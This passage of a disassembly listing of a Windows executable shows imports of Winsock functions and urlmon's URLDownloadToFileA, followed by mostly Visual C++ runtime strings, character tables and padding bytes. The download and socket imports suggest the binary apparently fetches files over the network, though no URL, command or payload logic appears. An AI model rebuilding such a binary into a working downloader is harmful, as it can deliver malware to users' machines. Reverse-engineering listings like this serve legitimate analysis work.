                                        ; sub_401E10+200↑p ...

;
; Imports from WS2_32.dll
;
                extrn __imp_WS2_32_52:dword
                                        ; DATA XREF: WS2_32_52↑r
                                        ; .rdata:00424008↓o
                extrn __imp_WS2_32_111:dword
                                        ; DATA XREF: WS2_32_111↑r
                extrn __imp_WS2_32_11:dword
                                        ; DATA XREF: WS2_32_11↑r
                extrn __imp_WS2_32_115:dword
                                        ; DATA XREF: WS2_32_115↑r
                extrn __imp_WS2_32_12:dword
                                        ; DATA XREF: WS2_32_12↑r
                extrn __imp_WS2_32_57:dword
                                        ; DATA XREF: WS2_32_57↑r

;
; Imports from urlmon.dll
;
; HRESULT __stdcall URLDownloadToFileA(LPUNKNOWN, LPCSTR, LPCSTR, DWORD, LPBINDSTATUSCALLBACK)
                extrn __imp_URLDownloadToFileA:dword
                                        ; DATA XREF: URLDownloadToFileA↑r
                                        ; .rdata:0042401C↓o


; ===========================================================================

; Segment type: Pure data
; Segment permissions: Read
_rdata          segment para public 'DATA' use32
                assume cs:_rdata
                ;org 4201ECh
unk_4201EC      db    0                 ; DATA XREF: sub_412E24+4B↑o
                db    0
                db    0
                db    0
                dd offset sub_41F210
                dd offset sub_41F230
                dd offset sub_41F280
unk_4201FC      db    0                 ; DATA XREF: sub_412E24+50↑o
                db    0
                db    0
                db    0
unk_420200      db    0                 ; DATA XREF: sub_412E24+31↑o
                db    0
                db    0
                db    0
                dd offset byte_40E8E8
                dd offset sub_411DBE
                dd offset sub_4135A0
                dd offset sub_41675A
                dd offset sub_417630
unk_420218      db    0                 ; DATA XREF: sub_412E24+2C↑o
                db    0
                db    0
                db    0
unk_42021C      db    0                 ; DATA XREF: sub_412EA9+D1↑o
                db    0
                db    0
                db    0
                dd offset sub_41CF36
                dd offset sub_413651
unk_420228      db    0                 ; DATA XREF: sub_412EA9:loc_412F75↑o
                db    0
                db    0
                db    0
unk_42022C      db    0                 ; DATA XREF: sub_412EA9+E1↑o
                db    0
                db    0
                db    0
unk_420230      db    0                 ; DATA XREF: sub_412EA9:loc_412F85↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
; Debug Directory entries
                dd 0                    ; Characteristics
                dd 4EE574CFh            ; TimeDateStamp: Mon Dec 12 03:28:15 2011
                dw 0                    ; MajorVersion
                dw 0                    ; MinorVersion
                dd 2                    ; Type: IMAGE_DEBUG_TYPE_CODEVIEW
                dd 57h                  ; SizeOfData
                dd rva asc_422880       ; AddressOfRawData
                dd 21080h               ; PointerToRawData
                dd offset unk_422A6C
off_420260      dd offset sub_401010    ; DATA XREF: sub_401000↑o
                                        ; sub_401010+3↑o ...
                dd offset sub_40E72C
                dd offset unk_422A20
off_42026C      dd offset sub_4011B0    ; DATA XREF: sub_4010D0+36↑o
                                        ; sub_401170+3↑o ...
                dd offset sub_401140
                dd offset unk_4229D0
off_420278      dd offset sub_4011B0    ; DATA XREF: sub_401150+D↑o
                                        ; sub_4092F0+74↑o ...
                dd offset sub_401140
                dd offset unk_422980
off_420284      dd offset sub_4011B0    ; DATA XREF: sub_401200+D↑o
                                        ; sub_401220+D↑o ...
                dd offset sub_401140
aStringTooLong  db 'string too long',0  ; DATA XREF: sub_40E26B+C↑o
aInvalidStringP db 'invalid string position',0
                                        ; DATA XREF: sub_40E2A3+C↑o
                dd offset unk_4228D8
off_4202B8      dd offset sub_40E739    ; DATA XREF: sub_40E638+A↑o
                                        ; sub_40E649+D↑o ...
                dd offset sub_40E72C
aUnknownExcepti db 'Unknown exception',0
                                        ; DATA XREF: sub_40E72C+7↑o
                align 4
                dd offset unk_4228EC
off_4202D8      dd offset sub_40F7AF    ; DATA XREF: sub_40F79F+3↑o
                                        ; .data:off_425014↓o ...
unk_4202DC      db  63h ; c             ; DATA XREF: sub_41032B+10↑o
                db  73h ; s
                db  6Dh ; m
                db 0E0h ; à
                db    1
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    3
                db    0
                db    0
                db    0
                db  20h
                db    5
                db  93h ; “
                db  19h
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
; struct _EXCEPTION_POINTERS ExceptionInfo
ExceptionInfo   _EXCEPTION_POINTERS <offset dword_42AAE0, offset dword_42AB38>
                                        ; DATA XREF: sub_4107C6+D6↑o
                                        ; sub_410B61+14F↑r
aNull_0:                                ; DATA XREF: .data:off_4251BC↓o
                text "UTF-16LE", '(null)',0
                align 4
aNull           db '(null)',0           ; DATA XREF: .data:off_4251B8↓o
                align 10h
byte_420320     db 6                    ; DATA XREF: sub_410B61:loc_410CC2↑r
                db    0
                db    0
                db    6
                db    0
                db    1
                db    0
                db    0
                db  10h
                db    0
                db    3
                db    6
                db    0
                db    6
                db    2
                db  10h
                db    4
                db  45h ; E
                db  45h ; E
                db  45h ; E
                db    5
                db    5
                db    5
                db    5
                db    5
                db  35h ; 5
                db  30h ; 0
                db    0
                db  50h ; P
                db    0
                db    0
                db    0
                db    0
                db  28h ; (
                db  20h
                db  38h ; 8
                db  50h ; P
                db  58h ; X
                db    7
                db    8
                db    0
                db  37h ; 7
                db  30h ; 0
                db  30h ; 0
                db  57h ; W
                db  50h ; P
                db    7
                db    0
                db    0
                db  20h
                db  20h
                db    8
                db    0
                db    0
                db    0
                db    0
                db    8
                db  60h ; `
                db  68h ; h
                db  60h ; `
                db  60h ; `
                db  60h ; `
                db  60h ; `
                db    0
                db    0
                db  78h ; x
                db  70h ; p
                db  78h ; x
                db  78h ; x
                db  78h ; x
                db  78h ; x
                db    8
                db    7
                db    8
                db    0
                db    0
                db    7
                db    0
                db    8
                db    8
                db    8
                db    0
                db    0
                db    8
                db    0
                db    8
                db    0
                db    7
                db    8
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    1
                db    2
                db    3
                db    4
                db    5
                db    6
                db    7
                db    8
                db    9
                db  0Ah
                db  0Bh
                db  0Ch
                db  0Dh
                db  0Eh
                db  0Fh
                db  10h
                db  11h
                db  12h
                db  13h
                db  14h
                db  15h
                db  16h
                db  17h
                db  18h
                db  19h
                db  1Ah
                db  1Bh
                db  1Ch
                db  1Dh
                db  1Eh
                db  1Fh
                db  20h
                db  21h ; !
                db  22h ; "
                db  23h ; #
                db  24h ; $
                db  25h ; %
                db  26h ; &
                db  27h ; '
                db  28h ; (
                db  29h ; )
                db  2Ah ; *
                db  2Bh ; +
                db  2Ch ; ,
                db  2Dh ; -
                db  2Eh ; .
                db  2Fh ; /
                db  30h ; 0
                db  31h ; 1
                db  32h ; 2
                db  33h ; 3
                db  34h ; 4
                db  35h ; 5
                db  36h ; 6
                db  37h ; 7
                db  38h ; 8
                db  39h ; 9
                db  3Ah ; :
                db  3Bh ; ;
                db  3Ch ; <
                db  3Dh ; =
                db  3Eh ; >
                db  3Fh ; ?
                db  40h ; @
                db  41h ; A
                db  42h ; B
                db  43h ; C
                db  44h ; D
                db  45h ; E
                db  46h ; F
                db  47h ; G
                db  48h ; H
                db  49h ; I
                db  4Ah ; J
                db  4Bh ; K
                db  4Ch ; L
                db  4Dh ; M
                db  4Eh ; N
                db  4Fh ; O
                db  50h ; P
                db  51h ; Q
                db  52h ; R
                db  53h ; S
                db  54h ; T
                db  55h ; U
                db  56h ; V
                db  57h ; W
                db  58h ; X
                db  59h ; Y
                db  5Ah ; Z
                db  5Bh ; [
                db  5Ch ; \
                db  5Dh ; ]
                db  5Eh ; ^
                db  5Fh ; _
                db  60h ; `
                db  61h ; a
                db  62h ; b
                db  63h ; c
                db  64h ; d
                db  65h ; e
                db  66h ; f
                db  67h ; g
                db  68h ; h
                db  69h ; i
                db  6Ah ; j
                db  6Bh ; k
                db  6Ch ; l
                db  6Dh ; m
                db  6Eh ; n
                db  6Fh ; o
                db  70h ; p
                db  71h ; q
                db  72h ; r
                db  73h ; s
                db  74h ; t
                db  75h ; u
                db  76h ; v
                db  77h ; w
                db  78h ; x
                db  79h ; y
                db  7Ah ; z
                db  7Bh ; {
                db  7Ch ; |
                db  7Dh ; }
                db  7Eh ; ~
                db  7Fh ; 
                db    0
; CHAR aEncodepointer[]
aEncodepointer  db 'EncodePointer',0    ; DATA XREF: sub_412101:loc_412155↑o
                                        ; sub_4122A5+3A↑o
                align 10h
; const WCHAR aKernel32Dll_0
aKernel32Dll_0:                         ; DATA XREF: sub_412101:loc_41213A↑o
                                        ; sub_41217C:loc_4121B5↑o ...
                text "UTF-16LE", 'KERNEL32.DLL',0
                align 4
; CHAR aDecodepointer[]
aDecodepointer  db 'DecodePointer',0    ; DATA XREF: sub_41217C:loc_4121D0↑o
                                        ; sub_4122A5+4E↑o
                align 4
; CHAR aFlsfree[]
aFlsfree        db 'FlsFree',0          ; DATA XREF: sub_4125BC+4D↑o
; CHAR aFlssetvalue[]
aFlssetvalue    db 'FlsSetValue',0      ; DATA XREF: sub_4125BC+40↑o
; CHAR aFlsgetvalue[]
aFlsgetvalue    db 'FlsGetValue',0      ; DATA XREF: sub_4125BC+33↑o
; CHAR aFlsalloc[]
aFlsalloc       db 'FlsAlloc',0         ; DATA XREF: sub_4125BC+2B↑o
                align 4
; CHAR aCorexitprocess[]
aCorexitprocess db 'CorExitProcess',0   ; DATA XREF: sub_412D8E+14↑o
                align 4
; const WCHAR aMscoreeDll
aMscoreeDll:                            ; DATA XREF: sub_412D8E+5↑o
                text "UTF-16LE", 'mscoree.dll',0
unk_420490      db    5                 ; DATA XREF: sub_4122A5+29↑o
                                        ; sub_41241F+7C↑o
                db    0
                db    0
                db 0C0h ; À
                db  0Bh
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  1Dh
                db    0
                db    0
                db 0C0h ; À
                db    4
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  96h ; –
                db    0
                db    0
                db 0C0h ; À
                db    4
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  8Dh
                db    0
                db    0
                db 0C0h ; À
                db    8
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  8Eh ; Ž
                db    0
                db    0
                db 0C0h ; À
                db    8
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  8Fh
                db    0
                db    0
                db 0C0h ; À
                db    8
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  90h
                db    0
                db    0
                db 0C0h ; À
                db    8
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  91h ; ‘
                db    0
                db    0
                db 0C0h ; À
                db    8
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  92h ; ’
                db    0
                db    0
                db 0C0h ; À
                db    8
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db  93h ; “
                db    0
                db    0
                db 0C0h ; À
                db    8
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
unk_420508      db  63h ; c             ; DATA XREF: sub_41374F+1D3↑o
                db  63h ; c
                db  73h ; s
                db    0
aUtf8           db 'UTF-8',0            ; DATA XREF: sub_41374F+200↑o
                align 4
aUtf16le        db 'UTF-16LE',0         ; DATA XREF: sub_41374F+220↑o
                align 10h
aUnicode        db 'UNICODE',0          ; DATA XREF: sub_41374F+240↑o
off_420528      dd offset sub_415704    ; DATA XREF: sub_412E24+5↑r
                                        ; sub_412E24+E↑o ...
off_42052C      dd offset nullsub_1     ; DATA XREF: StartAddress:loc_40EA49↑r
                                        ; StartAddress+68↑o ...
off_420530      dd offset nullsub_1     ; DATA XREF: sub_40E96C+5↑r
                                        ; sub_40E96C+E↑o ...
aRuntimeError   db 'runtime error ',0   ; DATA XREF: .data:00425DAC↓o
                align 4
asc_420544      db 0Dh,0Ah,0            ; DATA XREF: .data:00425DA4↓o
                align 4
aTlossError     db 'TLOSS error',0Dh,0Ah,0
                                        ; DATA XREF: .data:00425D9C↓o
                align 4
aSingError      db 'SING error',0Dh,0Ah,0
                                        ; DATA XREF: .data:00425D94↓o
                align 4
aDomainError    db 'DOMAIN error',0Dh,0Ah,0
                                        ; DATA XREF: .data:00425D8C↓o
                align 4
aR6034AnApplica db 'R6034',0Dh,0Ah      ; DATA XREF: .data:00425D84↓o
                db 'An application has made an attempt to load the C runtime library '
                db 'incorrectly.',0Ah
                db 'Please contact the application',27h,'s support team for more info'
                db 'rmation.',0Dh,0Ah,0
                align 8
aR6033AttemptTo db 'R6033',0Dh,0Ah      ; DATA XREF: .data:00425D7C↓o
                db '- Attempt to use MSIL code from this assembly during native code '
                db 'initialization',0Ah
                db 'This indicates a bug in your application. It is most likely the r'
                db 'esult of calling an MSIL-compiled (/clr) function from a native c'
                db 'onstructor or from DllMain.',0Dh,0Ah,0
                align 10h
aR6032NotEnough db 'R6032',0Dh,0Ah      ; DATA XREF: .data:00425D74↓o
                db '- not enough space for locale information',0Dh,0Ah,0
                align 8
aR6031AttemptTo db 'R6031',0Dh,0Ah      ; DATA XREF: .data:00425D6C↓o
                db '- Attempt to initialize the CRT more than once.',0Ah
                db 'This indicates a bug in your application.',0Dh,0Ah,0
                align 4
aR6030CrtNotIni db 'R6030',0Dh,0Ah      ; DATA XREF: .data:00425D64↓o
                db '- CRT not initialized',0Dh,0Ah,0
                align 4
aR6028UnableToI db 'R6028',0Dh,0Ah      ; DATA XREF: .data:00425D5C↓o
                db '- unable to initialize heap',0Dh,0Ah,0
                align 4
aR6027NotEnough db 'R6027',0Dh,0Ah      ; DATA XREF: .data:00425D54↓o
                db '- not enough space for lowio initialization',0Dh,0Ah,0
                align 4
aR6026NotEnough db 'R6026',0Dh,0Ah      ; DATA XREF: .data:00425D4C↓o
                db '- not enough space for stdio initialization',0Dh,0Ah,0
                align 4
aR6025PureVirtu db 'R6025',0Dh,0Ah      ; DATA XREF: .data:00425D44↓o
                db '- pure virtual function call',0Dh,0Ah,0
                align 4
aR6024NotEnough db 'R6024',0Dh,0Ah      ; DATA XREF: .data:00425D3C↓o
                db '- not enough space for _onexit/atexit table',0Dh,0Ah,0
                align 4
aR6019UnableToO db 'R6019',0Dh,0Ah      ; DATA XREF: .data:00425D34↓o
                db '- unable to open console device',0Dh,0Ah,0
                align 10h
aR6018Unexpecte db 'R6018',0Dh,0Ah      ; DATA XREF: .data:00425D2C↓o
                db '- unexpected heap error',0Dh,0Ah,0
                align 4
aR6017Unexpecte db 'R6017',0Dh,0Ah      ; DATA XREF: .data:00425D24↓o
                db '- unexpected multithread lock error',0Dh,0Ah,0
                align 4
aR6016NotEnough db 'R6016',0Dh,0Ah      ; DATA XREF: .data:00425D1C↓o
                db '- not enough space for thread data',0Dh,0Ah,0
aThisApplicatio db 0Dh,0Ah              ; DATA XREF: .data:00425D14↓o
                db 'This application has requested the Runtime to terminate it in an '
                db 'unusual way.',0Ah
                db 'Please contact the application',27h,'s support team for more info'
                db 'rmation.',0Dh,0Ah,0
                align 4
aR6009NotEnough db 'R6009',0Dh,0Ah      ; DATA XREF: .data:00425D0C↓o
                db '- not enough space for environment',0Dh,0Ah,0
aR6008NotEnough db 'R6008',0Dh,0Ah      ; DATA XREF: .data:00425D04↓o
                db '- not enough space for arguments',0Dh,0Ah,0
                align 10h
aR6002FloatingP db 'R6002',0Dh,0Ah      ; DATA XREF: .data:off_425CFC↓o
                db '- floating point support not loaded',0Dh,0Ah,0
                align 10h
aMicrosoftVisua db 'Microsoft Visual C++ Runtime Library',0
                                        ; DATA XREF: sub_41740A+164↑o
                align 4
asc_420AB8      db 0Ah                  ; DATA XREF: sub_41740A:loc_417524↑o
                db 0Ah,0
                align 4
asc_420ABC      db '...',0              ; DATA XREF: sub_41740A+F2↑o
aProgramNameUnk db '<program name unknown>',0
                                        ; DATA XREF: sub_41740A+AD↑o
                align 4
aRuntimeErrorPr db 'Runtime Error!',0Ah ; DATA XREF: sub_41740A+65↑o
                db 0Ah
                db 'Program: ',0
                align 4
off_420AF4      dd offset sub_417DA8    ; DATA XREF: SEH_4132F0+EA↑r
                                        ; SEH_4132F0+F3↑o ...
                dd offset unk_422934
off_420AFC      dd offset sub_417BB3    ; DATA XREF: sub_417B8A+11↑o
                                        ; sub_417BA8↑o ...
                dd offset sub_40E72C
aBadException   db 'bad exception',0    ; DATA XREF: sub_4183F9+14D↑o
                align 8
                db    6
                db  80h ; €
                db  80h ; €
                db  86h ; †
                db  80h ; €
                db  81h
                db  80h ; €
                db    0
                db    0
                db  10h
                db    3
                db  86h ; †
                db  80h ; €
                db  86h ; †
                db  82h ; ‚
                db  80h ; €
                db  14h
                db    5
                db    5
                db  45h ; E
                db  45h ; E
                db  45h ; E
                db  85h ; …
                db  85h ; …
                db  85h ; …
                db    5
                db    0
                db    0
                db  30h ; 0
                db  30h ; 0
                db  80h ; €
                db  50h ; P
                db  80h ; €
                db  88h ; ˆ
                db    0
                db    8
                db    0
                db  28h ; (
                db  27h ; '
                db  38h ; 8
                db  50h ; P
                db  57h ; W
                db  80h ; €
                db    0
                db    7
                db    0
                db  37h ; 7
                db  30h ; 0
                db  30h ; 0
                db  50h ; P
                db  50h ; P
                db  88h ; ˆ
                db    0
                db    0
                db    0
                db  20h
                db  28h ; (
                db  80h ; €
                db  88h ; ˆ
                db  80h ; €
                db  80h ; €
                db    0
                db    0
                db    0
                db  60h ; `
                db  68h ; h
                db  60h ; `
                db  68h ; h
                db  68h ; h
                db  68h ; h
                db    8
                db    8
                db    7
                db  78h ; x
                db  70h ; p
                db  70h ; p
                db  77h ; w
                db  70h ; p
                db  70h ; p
                db    8
                db    8
                db    0
                db    0
                db    8
                db    0
                db    8
                db    0
                db    7
                db    8
                db    0
                db    0
                db    0
; const WCHAR SrcStr
SrcStr          dw 0                    ; DATA XREF: sub_418E45+27↑o
                                        ; sub_41922F+29↑o
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
asc_420C78:                             ; DATA XREF: .data:off_4257B8↓o
                                        ; .data:00425E10↓o
                text "UTF-16LE", '         (((((                  H'
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  81h
                db    0
                db  81h
                db    0
                db  81h
                db    0
                db  81h
                db    0
                db  81h
                db    0
                db  81h
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db    1
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  82h ; ‚
                db    0
                db  82h ; ‚
                db    0
                db  82h ; ‚
                db    0
                db  82h ; ‚
                db    0
                db  82h ; ‚
                db    0
                db  82h ; ‚
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db    2
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  20h
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
                db    0
unk_420E7A      db  20h                 ; DATA XREF: .data:off_425E14↓o
                db    0
aHH:                                    ; DATA XREF: .data:004256E0↓o
                text "UTF-16LE", '        h((((                  H'
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  84h ; „
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  81h
                db    1
                db  81h
                db    1
                db  81h
                db    1
                db  81h
                db    1
                db  81h
                db    1
                db  81h
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  82h ; ‚
                db    1
                db  82h ; ‚
                db    1
                db  82h ; ‚
                db    1
                db  82h ; ‚
                db    1
                db  82h ; ‚
                db    1
                db  82h ; ‚
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  20h
                db    0
                db  48h ; H
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  14h
                db    0
                db  14h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  14h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db  10h
                db    0
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db  10h
                db    0
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
                db    2
                db    1
